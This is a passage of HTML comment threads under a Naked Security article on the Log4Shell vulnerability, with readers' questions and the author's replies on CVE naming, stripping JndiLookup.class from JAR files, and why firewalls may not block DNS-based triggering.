									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>This vulnerability isn’t limited to internet-facing servers, let alone to web servers&#8230; as explained in the article, the flaw can be triggered wherever a server processes user-supplied data. So if web server (HTTP or HTTPS) receives user data via, say, a web form and passes that data on to a back-end business server, the problem could happen on that business server, if that data gets logged somewhere.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370346"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370346={"id":7238218,"unique_id":"wp-comment-6370346","title":"This%20vulnerability%20isnt%20limited%20to%20internet-facing%20servers%2C%20let%20alone%20to%20web%20servers...%20as%20explained%20in%20the%20article%2C%20the%20flaw%20can%20be%20triggered%20wherever%20a%20server%20processes%20user-supplied%20data.%20So%20i%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370346","item_id":"_comm_6370346"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370346#respond' data-commentid="6370346" data-postid="647469" data-belowelement="div-comment-6370346" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370187" class="comment odd alt thread-even depth-1 parent">
			<article id="div-comment-6370187" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/05293fbabda5ac919b290dae5a01ef58?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/05293fbabda5ac919b290dae5a01ef58?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Bruce</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370187"><time datetime="2021-12-13T21:07:23+00:00">December 13, 2021 at 9:07 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>What an excellent article!</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370187"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370187={"id":7238218,"unique_id":"wp-comment-6370187","title":"What%20an%20excellent%20article%21%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370187","item_id":"_comm_6370187"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370187#respond' data-commentid="6370187" data-postid="647469" data-belowelement="div-comment-6370187" data-respondelement="respond" data-replyto="Reply to Bruce" aria-label='Reply to Bruce'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370207" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370207" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370207"><time datetime="2021-12-13T22:52:13+00:00">December 13, 2021 at 10:52 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Thanks, glad you found it useful.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370207"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370207={"id":7238218,"unique_id":"wp-comment-6370207","title":"Thanks%2C%20glad%20you%20found%20it%20useful.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370207","item_id":"_comm_6370207"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370207#respond' data-commentid="6370207" data-postid="647469" data-belowelement="div-comment-6370207" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370203" class="comment odd alt thread-odd thread-alt depth-1 parent">
			<article id="div-comment-6370203" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/27eaa56205722a1abed5b07a8812a381?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/27eaa56205722a1abed5b07a8812a381?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Justin Cowan</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370203"><time datetime="2021-12-13T22:26:15+00:00">December 13, 2021 at 10:26 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>&#8220;The primary cause of Log4Shell, formally known as CVE-2021-44228&#8221;</p>
<p>Shouldn&#8217;t it be &#8220;also know as &#8220;CVE-2021-44228&#8243;&#8221;. Would that be more correct? Just making sure I&#8217;m on the same page.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370203"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370203={"id":7238218,"unique_id":"wp-comment-6370203","title":"%26quot%3BThe%20primary%20cause%20of%20Log4Shell%2C%20formally%20known%20as%20CVE-2021-44228%26quot%3BShouldn%26%23039%3Bt%20it%20be%20%26quot%3Balso%20know%20as%20%26quot%3BCVE-2021-44228%26quot%3B%26quot%3B.%20Would%20that%20be%20more%20correct%3F%20Just%20making%20sure%20I%26%23039%3Bm%20on%20the%20same%20page.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370203","item_id":"_comm_6370203"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370203#respond' data-commentid="6370203" data-postid="647469" data-belowelement="div-comment-6370203" data-respondelement="respond" data-replyto="Reply to Justin Cowan" aria-label='Reply to Justin Cowan'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370210" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370210" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370210"><time datetime="2021-12-13T23:01:09+00:00">December 13, 2021 at 11:01 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>I think it&#8217;s fair to describe the CVE-xxxx-yyyy moniker as the &#8220;formal&#8221; name (even though it&#8217;s not part of a legally binding process, or issued in accordance with some sort of international treaty) because these identifiers are allocated formally, using a process that prevents numbering collisions, provides a common label, and ensures that duplicate reports don&#8217;t turn into two differently numbered bugs. (Indeed, &#8220;C&#8221; is for &#8220;Common&#8221;.)</p>
<p>Log4Shell is a casual name &#8211; indeed, it&#8217;s simply &#8220;the one that stuck&#8221;, after the people who came up with that name realised that their first choice, LogJam, had already been used for an entirely different flaw (where log referred to discrete logarithms) many years ago.</p>
<p>So I am happy with calling the CVE number &#8220;formal&#8221;, and Log4Shell &#8220;informal&#8221;. Think of the word &#8220;formal&#8221; in the sense of &#8220;evening wear&#8221; rather than in the sense of &#8220;court hearing&#8221;.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370210"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370210={"id":7238218,"unique_id":"wp-comment-6370210","title":"I%20think%20it%26%23039%3Bs%20fair%20to%20describe%20the%20CVE-xxxx-yyyy%20moniker%20as%20the%20%26quot%3Bformal%26quot%3B%20name%20%28even%20though%20it%26%23039%3Bs%20not%20part%20of%20a%20legally%20binding%20process%2C%20or%20issued%20in%20accordance%20with%20some%20sort%20of%20international%20treat%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370210","item_id":"_comm_6370210"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370210#respond' data-commentid="6370210" data-postid="647469" data-belowelement="div-comment-6370210" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370211" class="comment odd alt thread-even depth-1 parent">
			<article id="div-comment-6370211" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/6878fa1398a223e707bbc468a74bbfe5?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6878fa1398a223e707bbc468a74bbfe5?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Olivier</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370211"><time datetime="2021-12-13T23:05:17+00:00">December 13, 2021 at 11:05 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Thew madness here is: why does a logger need such elaborate  lookup functionality in the first place? It is all those exotic features (to be polite) that make software fragile and insecure.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370211"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370211={"id":7238218,"unique_id":"wp-comment-6370211","title":"Thew%20madness%20here%20is%3A%20why%20does%20a%20logger%20need%20such%20elaborate%20%20lookup%20functionality%20in%20the%20first%20place%3F%20It%20is%20all%20those%20exotic%20features%20%28to%20be%20polite%29%20that%20make%20software%20fragile%20and%20insecure.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370211","item_id":"_comm_6370211"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370211#respond' data-commentid="6370211" data-postid="647469" data-belowelement="div-comment-6370211" data-respondelement="respond" data-replyto="Reply to Olivier" aria-label='Reply to Olivier'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370222" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370222" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370222"><time datetime="2021-12-13T23:41:35+00:00">December 13, 2021 at 11:41 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Because a job worth doing IS WORTH OVERDOING!</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370222"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370222={"id":7238218,"unique_id":"wp-comment-6370222","title":"Because%20a%20job%20worth%20doing%20IS%20WORTH%20OVERDOING%21%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370222","item_id":"_comm_6370222"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370222#respond' data-commentid="6370222" data-postid="647469" data-belowelement="div-comment-6370222" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370391" class="comment odd alt thread-odd thread-alt depth-1 parent">
			<article id="div-comment-6370391" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/aa8d3ec44abdea260798c45b0cac81f6?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/aa8d3ec44abdea260798c45b0cac81f6?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Peter Fell</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370391"><time datetime="2021-12-14T12:00:57+00:00">December 14, 2021 at 12:00 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Paul &#8211; silly question but a PowerShell search (GetChildItem of the JAR files on a server) parsed through &#8220;select-string &#8220;JndiLookup.class&#8221;&#8221; returns such a string in a non-Log4j JAR file i.e. ws-hubcommon.jar. In this case what would the mitigation be?</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370391"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370391={"id":7238218,"unique_id":"wp-comment-6370391","title":"Paul%20-%20silly%20question%20but%20a%20PowerShell%20search%20%28GetChildItem%20of%20the%20JAR%20files%20on%20a%20server%29%20parsed%20through%20%26quot%3Bselect-string%20%26quot%3BJndiLookup.class%26quot%3B%26quot%3B%20returns%20such%20a%20string%20in%20a%20non-Log4j%20JAR%20file%20i.e.%20ws-h%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370391","item_id":"_comm_6370391"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370391#respond' data-commentid="6370391" data-postid="647469" data-belowelement="div-comment-6370391" data-respondelement="respond" data-replyto="Reply to Peter Fell" aria-label='Reply to Peter Fell'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370402" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370402" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370402"><time datetime="2021-12-14T12:26:51+00:00">December 14, 2021 at 12:26 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>I can&#8217;t really answer that&#8230; but although this bug is dependent on JNDI&#8217;s rather liberal attitude to &#8220;look this up in a directory server&#8221; (where the returned &#8220;data&#8221; can be a Java class file to run!), the exploitability in the Log4j case is caused by the fact that the JNDI function calls *can be triggered by user-supplied data*. This makes the risky JNDI functions rather easy to invoke remotely, and that&#8217;s the danger.</p>
<p>JNDI is available to any and all Java apps because it&#8217;s part of the Java runtime, but then so are Java functions to make network connections, read and write arbitrary files, execute new processes, and so on. So, an app that uses JNDI isn&#8217;t automatically more dangerous that an app that uses any other potentially risky features, providing that it can&#8217;t be triggered to do its risky business at will by an outsider.</p>
<p>Having said that, if you are worried, you could try copying that JAR file (for backup, just in case) and performing the same manual excision of the dodgy-looking jndiLookup.class file from the JAR as detailed above for the log4j-core JAR file&#8230; if your app still works and your logging isn&#8217;t broken, then that might set your mind at rest until you hear (or don&#8217;t hear) from the vendor.</p>
<p>HtH.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370402"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370402={"id":7238218,"unique_id":"wp-comment-6370402","title":"I%20can%26%23039%3Bt%20really%20answer%20that...%20but%20although%20this%20bug%20is%20dependent%20on%20JNDI%26%23039%3Bs%20rather%20liberal%20attitude%20to%20%26quot%3Blook%20this%20up%20in%20a%20directory%20server%26quot%3B%20%28where%20the%20returned%20%26quot%3Bdata%26quot%3B%20can%20be%20a%20Java%20class%20file%20to%20r%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370402","item_id":"_comm_6370402"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370402#respond' data-commentid="6370402" data-postid="647469" data-belowelement="div-comment-6370402" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370430" class="comment odd alt thread-even depth-1">
			<article id="div-comment-6370430" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Matteo</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370430"><time datetime="2021-12-14T14:50:51+00:00">December 14, 2021 at 2:50 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Very precise and well written.</p>
<p>slf4j + logback is probably the way to go&#8230; you can transform a log4j.properties file into a logback.xml pretty easy and with quite mininal code adaptations.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370430"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370430={"id":7238218,"unique_id":"wp-comment-6370430","title":"Very%20precise%20and%20well%20written.slf4j%20%2B%20logback%20is%20probably%20the%20way%20to%20go...%20you%20can%20transform%20a%20log4j.properties%20file%20into%20a%20logback.xml%20pretty%20easy%20and%20with%20quite%20mininal%20code%20adaptations.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370430","item_id":"_comm_6370430"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370430#respond' data-commentid="6370430" data-postid="647469" data-belowelement="div-comment-6370430" data-respondelement="respond" data-replyto="Reply to Matteo" aria-label='Reply to Matteo'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
		<li id="comment-6370501" class="comment even thread-odd thread-alt depth-1 parent">
			<article id="div-comment-6370501" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Anonymous</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370501"><time datetime="2021-12-14T20:15:37+00:00">December 14, 2021 at 8:15 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>If your servers are properly firewalled, there should be no access to external jndi implementations.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370501"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370501={"id":7238218,"unique_id":"wp-comment-6370501","title":"If%20your%20servers%20are%20properly%20firewalled%2C%20there%20should%20be%20no%20access%20to%20external%20jndi%20implementations.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370501","item_id":"_comm_6370501"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370501#respond' data-commentid="6370501" data-postid="647469" data-belowelement="div-comment-6370501" data-respondelement="respond" data-replyto="Reply to " aria-label='Reply to '>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370512" class="comment byuser comment-author-pducklin bypostauthor odd alt depth-2">
			<article id="div-comment-6370512" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370512"><time datetime="2021-12-14T21:20:21+00:00">December 14, 2021 at 9:20 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>As explained above, your firewall might not be enough if affected servers can mke DNS requests because the servername lookup that precedes the TCP connection would succeed before any subsequent TCP connection would fail.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370512"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370512={"id":7238218,"unique_id":"wp-comment-6370512","title":"As%20explained%20above%2C%20your%20firewall%20might%20not%20be%20enough%20if%20affected%20servers%20can%20mke%20DNS%20requests%20because%20the%20servername%20lookup%20that%20precedes%20the%20TCP%20connection%20would%20succeed%20before%20any%20subsequent%20T%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370512","item_id":"_comm_6370512"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370512#respond' data-commentid="6370512" data-postid="647469" data-belowelement="div-comment-6370512" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">What do you think? <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://nakedsecurity.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='647469' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
